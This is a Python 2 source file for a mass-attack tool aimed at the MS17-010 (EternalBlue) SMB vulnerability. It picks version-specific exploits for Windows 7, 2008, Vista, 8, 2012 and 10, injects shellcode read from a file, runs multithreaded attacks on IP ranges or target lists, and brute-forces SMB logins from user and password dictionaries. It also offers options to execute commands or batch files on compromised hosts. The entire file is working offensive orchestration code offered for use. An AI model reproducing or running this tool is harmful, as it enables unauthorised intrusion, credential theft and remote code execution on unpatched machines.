#!/usr/bin/python
# -*- coding:utf-8-*-
import os
import sys
import optparse
import Queue
import threading
import IPy
import globalFunc
import logger
import checker
import ExpMs17010
import resultTh
import expblue7
import expblue8
import blueAttack
import validate
#设定队列长度100000条
Max = 100000
#item = {'target':target,'user':user,'pwd':pwd}
addrsQueue = Queue.Queue(Max)
#item = {'target':target,'user':user,'pwd':pwd,'logon':'','vuln':'','piped':'','OS':'','arch':''}
checkQueue = Queue.Queue(Max)
#item = {'addr':ip}
exploitQueue = Queue.Queue(Max)
#每次读取文件最多行数
itemMax = 100000

checkResultDic = {}

exploitResultDic = {}

blueResultDic = {}

checkThList = []
expThList = []
blueAttackList = []

ipaddrsDic = {}

ADDRS = {'path':"",'offset':0}
USERS = {'path':"","offset":0,}
PWDS = {'path':"","offset":0,}
Param = {'mode':'0','addr':"",'port':445,'addrs':ADDRS,'user':"",'users' : USERS,'pwd' : "",'pwds' : PWDS,'threads':1,'cmd':"",'batch':""}

userList = []
pwdList = []

blueQueue = Queue.Queue(Max)

brltQueue = Queue.Queue(Max)

shellcodePath = "shellcode.bin"

blueThreads = []

def firstAttack():
    addr = Param['addr']
    logger.log.info('check target:%s user:%s pwd:%s'%(addr,Param['user'],Param['pwd']))
    expResult = ''
    try:
        checkResult = checker.checkVuln(addr,Param['user'],Param['pwd'])
        expResult = ExpMs17010.exploit(addr,Param['user'],Param['pwd'])
    except Exception as e:
        #doorSocket.close()
        logger.log.warning(str(e))   
    if expResult == '':
        logger.log.info(addr + " FAILURE!")
    else:
        logger.log.info(addr + " SUCCEED!")

#生成任务队列
def genTask(addr):
    item = {'target':addr,'user':'','pwd':''}
    
    addrsQueue.put(item,True)
    if(len(userList) != 0 and len(pwdList) != 0):
        for user in userList:
            for pwd in pwdList:
                item = {'target':addr,'user':user,'pwd':pwd}
                #logger.log.debug("task item : %s"%str(item))
                addrsQueue.put(item,True)
    if(len(userList) != 0 and len(pwdList) == 0):
        for user in userList:
            item = {'target':addr,'user':user,'pwd':''}
            #logger.log.debug("task item : %s"%str(item))
            addrsQueue.put(item,True)

def startDaemon():
    #启动检测攻击读取线程
    #if(len(userList) != 0):
    #checker.checkTh(addrsQueue,checkQueue,Param['threads'],checkResultDic,checkThList)
    ExpMs17010.exploitTh(addrsQueue,exploitQueue,Param['threads'],exploitResultDic,expThList)
    rth = resultTh.resultTh(exploitQueue,'EXP',0)
    rth.setDaemon(True)
    rth.start()
    
def checkOne(*pl):
    logger.log.debug("checkOne...") 
    #消费者线程
    checker.checkTh(addrsQueue,checkQueue,Param['threads'],checkResultDic,checkThList)
    #检测一个
    for addr in ipaddrsDic['ipaddrs']:
        logger.log.info('check target:%s user:%s pwd:%s'%(addr,Param['user'],Param['pwd']))
        checkResult = ''
        try:
            checkResult = checker.checkVuln(str(addr),Param['user'],Param['pwd'])
        except Exception as e:
            #doorSocket.close()
            logger.log.warning(str(e))   
        logger.log.info(str(addr) + "***" + str(checkResult))
        
        if(len(userList) != 0):
            #读取结果
            rth = resultTh.resultTh(checkQueue,"CHECKONE",1)
            rth.setDaemon(True)
            rth.start()
            
            #启动线程检测用户配置字典
            genTask(addr)
    
    for t in checkThList:
        t.join() 
    
    
def checkMul(*pl):
    logger.log.debug("checkMul...") 
    
    '''
    addr = Param['addr']
    try:
        logger.log.info('check target:%s user:%s pwd:%s'%(addr,Param['user'],Param['pwd']))       
        checkResult = checker.checkVuln(addr,Param['user'],Param['pwd'])
    except Exception as e:
        #doorSocket.close()
        logger.log.warning(str(e)) 
    '''
    if(os.path.isfile(Param['addrs']['path'])):
        #结果处理线程
        rth = resultTh.resultTh(checkQueue,'CHECKMUL',1)
        rth.setDaemon(True)
        rth.start()
        #消费者线程
        checker.checkTh(addrsQueue,checkQueue,Param['threads'],checkResultDic,checkThList)
        
        rth = resultTh.resultTh(checkQueue,"CHECKONE",1)
        rth.setDaemon(True)
        rth.start()
    
        #开始读取地址，按地址开始攻击
        try:
            fp = open(Param['addrs']['path'],'r') 
            for line in fp:
                addr = line.strip()
                #启动线程检测用户配置字典
                genTask(addr)
                
        except Exception,ex:
            logger.log.warning("read file error! ERROR:%s"%str(ex))   
        finally:
            if fp:
                fp.close()
    
    
    for t in checkThList:
        t.join()  
def attackOne(*pl):
    logger.log.debug("attackOne...")
    #检测漏洞，攻击单个目标
    firstAttack()
    #开启后台线程
    startDaemon()
    #生成任务对列
    for addr in ipaddrsDic['ipaddrs']:
        genTask(str(addr))
    
    for t in expThList:
        t.join()   
def attackMul(*pl):
    logger.log.debug("attackMul...")
    #开启后台线程
    startDaemon()
   
    #开始读取地址，按地址开始攻击
    try:
        file = open(Param['addrs']['path'],'r') 
        for line in file:
            addr = line.strip()
            #生成任务对列
            genTask(addr)
    except Exception,ex:
        logger.log.warning("read file error! ERROR:%s"%str(ex))   
    finally:
        if file:
            file.close()
    logger.log.debug("attackMul work starting...")
    for t in expThList:
        t.join()         
def blueAttackOne(*pl):
    logger.log.debug("blueAttackOne...")
    #global sc
    #fp = open(shellcodePath,'rb')
    #sc = fp.read()
    #fp.close()
    with open(shellcodePath, 'rb') as fp:
        sc = fp.read()
    if len(sc) > 0xe80:
        logger.log.debug('Shellcode too long. The place that this exploit put a shellcode is limited to {} bytes.'.format(0xe80))
    
    for target in ipaddrsDic['ipaddrs']:
        #target = Param['addr']
        logger.log.info('check target:%s '%target)
        result7 = ''
        result8 = ''
        try:
            checkResult = checker.checkVuln(str(target),'','')
            server_os = checkResult['OS']
            logger.log.info(str(target) + " " + server_os)
            if(server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith("Windows Vista")):
                result7 = expblue7.exploit(str(target) , sc ,13)
            elif(server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
                result8 = expblue8.exploit(str(target) , sc ,13)
            elif server_os.startswith("Windows 10 "):
                build = int(server_os.split()[-1])
                if build >= 14393:
                    result8 = expblue8.exploit(str(target) , sc ,13)
            else:
                logger.log.info('blue attack do not support this os:%s'%server_os)
        except Exception as e:
            #doorSocket.close()
            logger.log.warning(str(e))
        
        if(result7 != ''):
            logger.log.info( "%s blueAttack is good!"%target)
        elif(result8 != ''):
            logger.log.info( "%s blueAttack is good!"%target)
        else:
            logger.log.info( "%s blueAttack is failure!"%target )
        
        logger.log.info( "\n blueAttack is finished!" )

def blueAttackMul(*pl):
    logger.log.debug("blueAttackMul...")
    
    if(not os.path.isfile(Param['addrs']['path'])):
        logger.log.warning("NO FIND TARGET!") 
        sys.exit()
    
    #q启动后台线程
    for i in range(Param['threads']):
        bth = blueAttack.blueAttack(blueQueue,brltQueue,shellcodePath)
        blueAttackList.append(bth)
        bth.setDaemon(True)
        bth.start()
        blueThreads.append(bth)
    
    #读取结果线程
    rth = resultTh.resultTh(brltQueue,'BLUEATTACK',0)
    rth.setDaemon(True)
    rth.start()
    
    #开始读取地址，按地址开始攻击
    try:
        file = open(Param['addrs']['path'],'r') 
        for line in file:
            addr = line.strip()
            #生成任务对列
            item = {'addr':addr}
            blueQueue.put(item,True)
    except Exception,ex:
        logger.log.warning("read file error! ERROR:%s"%str(ex))   
    finally:
        if file:
            file.close()
    
    for t in blueAttackList:
        t.join()        
def parseOptions():
    #usage 定义的是使用方法，%prog 表示脚本本身，version定义的是脚本名字和版本号
    parse=optparse.OptionParser(usage='"usage:%prog [options] target"',version="%prog 1.0")
    parse.add_option('-m','--mode',dest='mode',type=str,metavar='MODE',default='0',help='attack mode 0:ms17010 attack one; 1: ms17010 attack by file; 2:blue attack one;3:blue attack Mul;4:check one;5:check Mul)')
    parse.add_option('-p','--port',dest='port',type=int,metavar='PORT',default=445,help='SMB SERVICE PORT')
    parse.add_option('-u','--user',dest='user',type=str,metavar='USER',default="",help='SMB USER')
    parse.add_option('-U','--users',dest='users',type=str,metavar='USERS',default="",help='user file,SMB USERS')
    parse.add_option('--pwd',dest='pwd',type=str,metavar='password',default="",help='SMB USER PASSWORD')
    parse.add_option('--pwds','--pwds',dest='pwds',type=str,metavar='passwords',default="",help='pwd file,EACH SMB USER PASSWORDS')
    parse.add_option('-t','--threads',dest='threads',type=int,metavar='THREADS',default=1,help='thread num')
    parse.add_option('-c','--cmd',dest='cmd',type=str,metavar='COMMOND',default="",help='execute commond on target')
    parse.add_option('-b','--batch',dest='batch',type=str,metavar='BATCH',default="",help='batch file,execute batch file on target')
    #parse.add_option('-v',help='MyExploiter Version!!')
    #-u,--user 表示一个是短选项 一个是长选项
    #dest='user' 将该用户输入的参数保存到变量user中，可以通过options.user方式来获取该值
    #type=str，表示这个参数值的类型必须是str字符型，如果是其他类型那么将强制转换为str（可能会报错）
    #metavar='user'，当用户查看帮助信息，如果metavar没有设值，那么显示的帮助信息的参数后面默认带上dest所定义的变量名
    #help='Enter..',显示的帮助提示信息
    #default=3306，表示如果参数后面没有跟值，那么将默认为变量default的值
    parse.set_defaults(v=1.0)  #也可以这样设置默认值
    options,args=parse.parse_args()
    logger.log.debug(",".join(args))
    if(len(args) < 1):
        parse.print_help()
        sys.exit()
    Param['mode'] = options.mode
    Param['port'] = options.port
    Param['user'] = options.user
    Param['users']['path'] = options.users
    Param['pwd'] = options.pwd
    Param['pwds']['path'] = options.pwds
    Param['threads'] = options.threads
    Param['cmd'] = options.cmd
    Param['batch'] = options.batch
    Param['addr'] = args[0]
    if(Param['mode'] == "1" or Param['mode'] == "3" or Param['mode'] == "5"):
        Param['addrs']['path'] = args[0]
        
def validateParam():
    if("NO" == modeDic.get(Param['mode'],'support')):
        logger.log.warning("mode do not support! value : 0 , 1 ,2,3,4,5")
        sys.exit()
    if(Param['port'] > 65535 or Param['port'] < 0):
        logger.log.warning("port error! value: 0-65535")
        sys.exit()
    if(Param['mode'] == '0' or Param['mode'] == '2' or Param['mode'] == '4'):
        try:
            #logger.log.debug("ipaddrs...")
            ipaddrs = IPy.IP(Param['addr'])
            ipaddrsDic['ipaddrs'] = ipaddrs
        except Exception,ex:
            logger.log.warning("target ip format is not ok!")
            sys.exit()

    if(Param['mode'] == "1" or Param['mode'] == "3" or Param['mode'] == "5"):
        if(not os.path.isfile(Param['addrs']['path'])):
            logger.log.warning("target ip file path is not ok!")
            sys.exit()
        
    infostr = '''****************\n***mode:''' + Param['mode']
    infostr += '''***\n***addr:''' + Param['addr']
    infostr += '''***\n***port:''' + str(Param['port'])
    infostr += '''***\n***addrs:''' + Param['addrs']['path']
    infostr += '''***\n***user:''' + Param['user']
    infostr += '''***\n***user file path:''' + Param['users']['path']
    infostr += '''***\n***pwd:''' + Param['pwd']
    infostr += '''***\n***pwds:''' + Param['pwds']['path']
    infostr += '''***\n***threads:''' + str(Param['threads'])
    infostr += '''***\n***cmd:''' + Param['cmd']
    infostr += '''***\n***batch file:''' + Param['batch']
    infostr += '''***\n***************'''
    logger.log.info("\n"+infostr)

modeDic = {'0':attackOne,"1":attackMul,"2":blueAttackOne,'3':blueAttackMul,'4':checkOne,'5':checkMul,'support':"NO"}   

if __name__ == "__main__":
    '''
	try:
        if not validate.validateT():
            logger.log.info("expired!")
            sys.exit()
    except Exception,ex:
        logger.log.info("verify failure! please connect internet") 
        sys.exit()      
    '''
    parseOptions()
    validateParam()

    command = raw_input('Confirm Attack?Y/N')
    
    if ('n' == command.lower() or 'no' == command.lower()):
        sys.exit()
    
    #填充参数列表#用用户密码字典攻击单个目标
    logger.log.info("parser user pwd dic...\n")
    if(Param['users']['path'] != '' and os.path.isfile(Param['addrs']['path'])):
        globalFunc.readLinesFromFile(Param['users']['path'],userList)
    if(Param['pwds']['path'] != '' and os.path.isfile(Param['pwds']['path'])):
        globalFunc.readLinesFromFile(Param['pwds']['path'],pwdList)
    
    logger.log.info("start attack...\n")
    modeDic.get(Param['mode'])(Param)